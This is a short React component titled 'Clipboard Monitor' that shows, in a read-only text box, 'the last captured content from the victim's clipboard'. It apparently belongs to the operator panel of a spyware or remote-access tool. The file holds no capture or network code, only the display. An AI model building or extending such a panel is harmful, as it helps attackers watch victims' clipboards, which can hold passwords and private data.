
'use client';

import { Card, CardHeader, CardTitle, CardDescription, CardContent } from '@/components/ui/card';
import { Clipboard } from 'lucide-react';
import { Textarea } from './ui/textarea';

type ClipboardMonitorProps = {
  content: string | null;
};

export function ClipboardMonitor({ content }: ClipboardMonitorProps) {

  return (
    <Card>
      <CardHeader>
        <div className="flex items-center gap-3">
          <Clipboard className="h-6 w-6" />
          <CardTitle>Clipboard Monitor</CardTitle>
        </div>
        <CardDescription>
          Displays the last captured content from the victim's clipboard.
        </CardDescription>
      </CardHeader>
      <CardContent>
        <Textarea 
            readOnly 
            value={content || "No clipboard content captured yet."}
            className="h-32 font-mono bg-primary/10"
        />
      </CardContent>
    </Card>
  );
}
